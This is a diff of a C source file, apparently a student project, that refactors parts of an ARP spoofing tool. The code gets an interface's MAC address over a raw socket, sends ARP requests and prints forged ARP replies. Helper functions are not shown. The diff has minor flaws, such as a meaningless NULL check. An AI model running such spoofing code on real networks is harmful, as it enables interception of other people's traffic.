@@ -11,66 +11,65 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
+#include <fcntl.h>
 #include "spoof.h"
 
-void print_victime(arp_header_t *arp_rep)
+int function_print(char **av)
 {
-    printf("Found victim's MAC address: '");
-    for (int i = 0; i < 6; ++i) {
-        printf("%02X", arp_rep->sender_mac[i]);
-        if (i < 5)
-            printf(":");
+    arp_header_t arp;
+
+    if (!get_addr_mac(&arp, av[2]))
+        return (FAILURE);
+    if (strcmp("--printBroadcast", av[3]) == 0 && av[4] == NULL) {
+        fill_struct(&arp, ARP_REQUEST);
+        fill_struct_ip(&arp, av[0], av[1]);
+        fill_struct_mac(&arp, BROADCAST);
     }
-    printf("'\n");
+    if (strcmp("--printSpoof", av[3]) == 0 && av[4] != NULL) {
+        fill_struct(&arp, ARP_REPLY);
+        fill_struct_ip(&arp, av[0], av[1]);
+        fill_struct_mac(&arp, av[4]);
+    }
+    print_struct(&arp, sizeof(arp));
+    return (SUCCESS);
 }
 
-void prepare_last_send(infohdr_t *rcv
-    , infohdr_t *fsend
-    , infohdr_t *lsend
-    , char **av)
+bool arpspoof(char *mac_addr, char **av, int sd, int ifindex)
 {
-    lsend->eth = (struct ethhdr *)lsend->buf;
-    lsend->arp = (arp_header_t *)(lsend->buf + ETH2_HEADER_LEN);
-    fill_arp(lsend->arp, ARP_REPLY, NULL, 0);
-    fill_arp_eth(lsend->eth, lsend->arp, &lsend->sock_addr, &fsend->if_mac);
-    fill_sock_addr(&lsend->sock_addr, fsend->ifindex);
-    fill_arp_send_target(lsend->arp, av[0], av[1]);
-    for (int i = 0; i < MAC_LENGTH; ++i) {
-        lsend->eth->h_dest[i] = rcv->arp->sender_mac[i];
-        lsend->arp->target_mac[i] = rcv->arp->sender_mac[i];
-    }
-}
+    arp_header_t arp;
+    struct sockaddr_ll sock_addr;
 
-static void arpspoof(int sd, infohdr_t *fsend, char **av)
-{
-    infohdr_t recv;
-
-    fsend->eth = (struct ethhdr *)fsend->buf;
-    fsend->arp = (arp_header_t *)(fsend->buf + ETH2_HEADER_LEN);
-    memset(fsend->buf, 0x00, BUF_SIZE);
-    fill_arp(fsend->arp, ARP_REQUEST, NULL, 0);
-    fill_arp_eth(fsend->eth, fsend->arp, &fsend->sock_addr, &fsend->if_mac);
-    fill_sock_addr(&fsend->sock_addr, fsend->ifindex);
-    fill_arp_send_target(fsend->arp, av[0], av[1]);
-    send_arp(sd, fsend);
-    receiv_arp(sd, fsend, &recv, av);
+    sscanf(mac_addr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx:"
+        , &(arp.send_mac[0]), &(arp.send_mac[1]), &(arp.send_mac[2])
+        , &(arp.send_mac[3]), &(arp.send_mac[4]), &(arp.send_mac[5]));
+    fill_struct(&arp, ARP_REQUEST);
+    fill_struct_ip(&arp, av[0], av[1]);
+    fill_struct_mac(&arp, BROADCAST);
+    fill_struct_sockaddr(&sock_addr, ifindex, &arp);
+    send_arp(sd, &arp, &sock_addr);
+    receiv_arp(sd, av, &arp, ifindex);
+    return (true);
 }
 
 int init_arpspoof(int ac, char **av)
 {
+    char *mac_addr = "";
     int sd = 0;
-    infohdr_t fsend;
+    int ifindex = 0;
+    struct ifreq send;
 
     if (ac >= 5)
-        return (print_function(av));
-    if (!create_socket(&sd))
+        return (function_print(av));
+    if (!create_socket(&sd) || mac_addr == NULL)
         return (FAILURE);
-    if (!check_ioctl(sd, SIOCGIFINDEX, &fsend.if_mac, av[2]))
+    if (!check_ioctl(sd, SIOCGIFINDEX, &send, av[2]))
         return (FAILURE);
-    fsend.ifindex = fsend.if_mac.ifr_ifindex;
-    if (!check_ioctl(sd, SIOCGIFHWADDR, &fsend.if_mac, av[2]))
+    ifindex = send.ifr_ifindex;
+    if (!check_ioctl(sd, SIOCGIFHWADDR, &send, av[2]))
         return (FAILURE);
-    arpspoof(sd, &fsend, av);
-    close(sd);
+    if ((mac_addr = fill_addr_mac(&send)) == NULL
+        || !arpspoof(mac_addr, av, sd, ifindex))
+        return (FAILURE);
+    free(mac_addr);
     return (SUCCESS);
 }
